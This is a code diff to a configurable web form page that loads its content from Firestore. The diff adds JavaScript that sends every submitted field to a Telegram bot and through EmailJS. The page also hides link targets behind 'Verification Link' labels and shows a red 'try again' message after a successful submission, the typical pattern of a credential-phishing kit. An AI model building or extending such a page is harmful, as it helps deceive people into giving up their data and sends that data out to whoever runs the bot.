@@ -16,8 +16,6 @@ body{
   background:#f4f6f8;
   padding:20px;
 }
-
-/* PAGE */
 #page{
   max-width:600px;
   margin:auto;
@@ -25,28 +23,21 @@ body{
   overflow:hidden;
   background:#fff;
 }
-
-/* BACKGROUND IMAGE SUPPORT */
 .bg{
   background-repeat:no-repeat;
   background-position:center;
   background-size:cover;
 }
-
-/* CONTENT */
 #content{padding:18px}
 
-/* MEDIA */
 .builder-media{text-align:center;margin-bottom:12px}
 .builder-media img{max-width:140px;margin-bottom:8px}
 .banner img{width:100%;border-radius:8px;margin-bottom:10px}
 
-/* TEXT */
-h2{text-align:center;margin:8px 0}
+h2{text-align:center}
 .subtitle{text-align:center;color:#555}
 .description{margin:10px 0}
 
-/* GALLERY */
 .gallery{
   display:grid;
   grid-template-columns:repeat(auto-fit,minmax(120px,1fr));
@@ -55,7 +46,13 @@ h2{text-align:center;margin:8px 0}
 }
 .gallery img{width:100%;border-radius:6px}
 
-/* EMBED LINKS */
+.video iframe{
+  width:100%;
+  height:200px;
+  border-radius:8px;
+  margin:8px 0;
+}
+
 .embedLink{
   background:#e8f0fe;
   padding:10px;
@@ -63,13 +60,12 @@ h2{text-align:center;margin:8px 0}
   margin:8px 0;
   font-size:14px;
   word-break:break-word;
-  overflow-wrap:anywhere;
 }
 .embedLink a{
   display:inline-block;
   margin-top:4px;
-  text-decoration:none;
   color:#1976d2;
+  text-decoration:none;
 }
 .embedLink small{
   display:block;
@@ -77,7 +73,6 @@ h2{text-align:center;margin:8px 0}
   color:#555;
 }
 
-/* FORM */
 form{
   max-width:420px;
   margin:12px auto;
@@ -96,14 +91,12 @@ button{
   cursor:pointer;
 }
 
-/* FOOTER */
 footer{
   text-align:center;
   font-size:12px;
   margin-top:14px;
   color:#777;
 }
-
 #tryAgain{
   color:#b71c1c;
   font-weight:bold;
@@ -114,6 +107,7 @@ footer{
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 
 <body>
@@ -142,6 +136,9 @@ footer{
 </div>
 
 <script>
+/* EMAILJS INIT */
+emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+
 const $ = id => document.getElementById(id);
 
 firebase.initializeApp({
@@ -164,7 +161,7 @@ db.collection("forms").doc(formId).get().then(doc=>{
   document.querySelector('meta[property="og:description"]').content = f.metaDesc || "";
   document.querySelector('meta[property="og:image"]').content = f.ogImage || "";
 
-  /* BACKGROUND IMAGE (FIXED) */
+  /* BACKGROUND */
   if(f.bgColor) $("page").style.background = f.bgColor;
   if(f.bgImageURL){
     $("page").classList.add("bg");
@@ -178,14 +175,8 @@ db.collection("forms").doc(formId).get().then(doc=>{
   if(f.bannerURL) $("banner").innerHTML = `<img src="${f.bannerURL}">`;
 
   /* TEXT */
-  if(f.title){
-    $("title").innerText = f.title;
-    $("title").style.color = f.titleColor || "#000";
-  }
-  if(f.subtitle){
-    $("subtitle").innerText = f.subtitle;
-    $("subtitle").style.color = f.subtitleColor || "#555";
-  }
+  if(f.title) $("title").innerText = f.title;
+  if(f.subtitle) $("subtitle").innerText = f.subtitle;
   if(f.description) $("description").innerText = f.description;
 
   /* GALLERY */
@@ -204,19 +195,17 @@ db.collection("forms").doc(formId).get().then(doc=>{
     }
   });
 
-  /* EMBED LINKS (RENAMED & NUMBERED) */
-  let linkCount = 1;
+  /* EMBED LINKS (MASKED, NO NUMBERS) */
   (f.embedLinks || []).forEach(l=>{
     if(!l.show || !l.url) return;
 
     $("links").innerHTML += `
       <div class="embedLink">
-        <strong>${l.text || "Verification Link"} ${linkCount}</strong>
-        <a href="${l.url}" target="_blank">Open link</a>
+        <strong>${l.text || "Verification Link"}</strong>
+        <a href="${l.url}" target="_blank">${l.text || "Open link"}</a>
         ${l.desc ? `<small>${l.desc}</small>` : ""}
       </div>
     `;
-    linkCount++;
   });
 
   /* WARNING */
@@ -269,18 +258,39 @@ function submitForm(e,f){
     data[i.name] = i.value;
   });
 
+  /* SAVE */
   db.collection("submissions").add({
     formId,
     data,
-    createdAt: new Date().toISOString()
-  }).then(()=>{
-    $("tryAgain").style.display = "block";
-    setTimeout(()=>$("tryAgain").style.display="none",3000);
-
-    if(f.enableRedirect && f.redirectURL){
-      setTimeout(()=>location.href = f.redirectURL,1500);
-    }
+    createdAt:new Date().toISOString()
   });
+
+  /* TELEGRAM */
+  let msg = "📝 New Form Submission\n\n";
+  Object.entries(data).forEach(([k,v])=>{
+    msg += `${k}: ${v}\n`;
+  });
+
+  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      chat_id:"YOUR_CHAT_ID",
+      text:msg
+    })
+  });
+
+  /* EMAIL ALERT */
+  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{
+    message: msg
+  });
+
+  $("tryAgain").style.display="block";
+  setTimeout(()=>$("tryAgain").style.display="none",3000);
+
+  if(f.enableRedirect && f.redirectURL){
+    setTimeout(()=>location.href = f.redirectURL,1500);
+  }
 }
 </script>
 </body>
